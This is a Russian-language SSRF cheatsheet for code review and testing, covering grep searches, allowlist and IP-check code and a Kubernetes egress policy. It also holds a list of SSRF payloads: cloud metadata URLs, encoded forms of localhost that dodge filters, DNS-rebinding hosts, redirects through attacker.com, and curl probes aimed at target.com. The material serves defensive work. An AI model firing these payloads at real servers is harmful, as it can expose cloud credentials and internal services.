# SSRF Cheatsheet

> Быстрая справка по Server-Side Request Forgery.

---

## Что искать на Code Review

```bash
# 1. Поиск HTTP-клиентов (Sink)
grep -rn "HttpClient\|RestTemplate\|WebClient" src/ --include="*.java"
grep -rn "requests\|httpx\|aiohttp" src/ --include="*.py"
grep -rn "fetch\|axios\|got\|request" src/ --include="*.js" --include="*.ts"
grep -rn "http.Get\|http.Post\|net/http" src/ --include="*.go"
grep -rn "HTTP::Request\|LWP::UserAgent" src/ --include="*.pl"

# 2. Поиск URL из пользовательского ввода (Source)
grep -rn "@RequestParam.*url\|@PathVariable.*url" src/ --include="*.java"
grep -rn "request.getParameter.*url\|\.params\[.*url" src/ --include="*.py"
grep -rn "req.query.*url\|req.body.*url" src/ --include="*.js" --include="*.ts"

# 3. Поиск опасных функций для загрузки
grep -rn "downloadImage\|importFromUrl\|fetchUrl\|loadFromURL" src/
grep -rn "openGraph\|webhook\|ssrf\|external.*url" src/
```

---

## Полезные payload для тестирования

```bash
# localhost
http://127.0.0.1
http://127.0.0.1:8080
http://localhost
http://0.0.0.0

# Внутренние сети
http://10.0.0.1
http://10.0.0.15
http://192.168.1.1
http://172.16.0.1

# Cloud Metadata
http://169.254.169.254        # AWS/GCP/Azure
http://169.254.169.254/latest/meta-data/      # AWS
http://metadata.google.internal               # GCP
http://169.254.169.254/metadata/instance      # Azure

# Обход фильтров (разные представления 127.0.0.1)
http://2130706433              # decimal
http://0x7f000001              # hex
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1              # octal
http://[::1]                   # IPv6
http://127.1                   # shorthand
http://0/
http://localhost/
http://lOcAlHoSt/
http://127.0.0.1.nip.io/      # DNS rebinding
http://1.1.1.1.127.0.0.1.xip.io/

# Redirect-based bypass
http://attacker.com/redirect?to=http://169.254.169.254
http://attacker.com/redirect-to?url=http://127.0.0.1:9090

# DNS Rebinding
# Используй сервисы вроде 1u.ms или rebind.it
http://7f000001.1u.ms          # resolves to 127.0.0.1
```

---

## Способы защиты

### 1. Allowlist доменов (рекомендуется)

```python
# ✅ БЕЗОПАСНО — разрешить только доверенные домены
ALLOWED_DOMAINS = [
    "images.example.com",
    "storage.example.com",
    "avatars.example.com"
]

def is_allowed(url: str) -> bool:
    hostname = urlparse(url).hostname
    return any(hostname == domain or hostname.endswith("." + domain)
              for domain in ALLOWED_DOMAINS)
```

### 2. Проверка IP после DNS Resolve

```python
import socket
import ipaddress

def is_safe_url(url: str) -> bool:
    hostname = urlparse(url).hostname

    # Разрешаем только http/https
    if urlparse(url).scheme not in ("http", "https"):
        return False

    # DNS Resolve
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return False

    # Проверка на private диапазоны
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback or addr.is_link_local:
        return False

    # Блокировка metadata endpoint
    if ip == "169.254.169.254":
        return False

    return True
```

### 3. Проверка редиректов

```python
def safe_fetch(url: str) -> str:
    checked_urls = set()
    while True:
        if not is_safe_url(url):
            raise ValueError("Forbidden URL")

        response = requests.get(url, allow_redirects=False)
        if 300 <= response.status_code < 400:
            url = response.headers["Location"]
            if url in checked_urls:
                raise ValueError("Redirect loop")
            checked_urls.add(url)
            continue
        return response.text
```

### 4. Сетевая защита (egress policy)

```yaml
# Kubernetes NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
spec:
  podSelector:
    matchLabels:
      app: web
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 10.0.0.0/8
        - 172.16.0.0/12
        - 192.168.0.0/16
        - 169.254.169.254/32
```

---

## Проверка после фикса

```bash
# 1. Проверить, что URL-функция не вызывает localhost
curl "https://target.com/fetch?url=http://127.0.0.1:8080"
# Должен вернуть 403 или empty

# 2. Проверить redirect bypass
curl "https://target.com/fetch?url=https://attacker.com/redirect"

# 3. Проверить DNS rebinding
curl "https://target.com/fetch?url=http://127.0.0.1.xip.io"

# 4. Проверить cloud metadata
curl "https://target.com/fetch?url=http://169.254.169.254"

# 5. Проверить, что allowlist работает
curl "https://target.com/fetch?url=https://evil.com/malware"
# Должен быть 403
```

---

## Типичные ошибки

| Ошибка | Почему не работает |
|--------|-------------------|
| Blacklist IP-адресов | Обходится через decimal, hex, octal, IPv6, redirect, DNS rebinding |
| Проверка только строки URL | DNS может резолвиться в другой IP |
| Нет проверки редиректов | `example.com` → 302 → `169.254.169.254` |
| Разрешены все протоколы | `file://`, `gopher://`, `dict://` могут дать доступ к файловой системе и Redis |
| Ограничение только на уровне приложения | Без сетевой защиты (egress policy) приложение может быть скомпрометировано |

---

## Связанные CWE

| CWE | Описание |
|-----|----------|
| **CWE-918** | Server-Side Request Forgery |
| **CWE-441** | Unintended Proxy |
| **CWE-610** | Externally Controlled Reference |
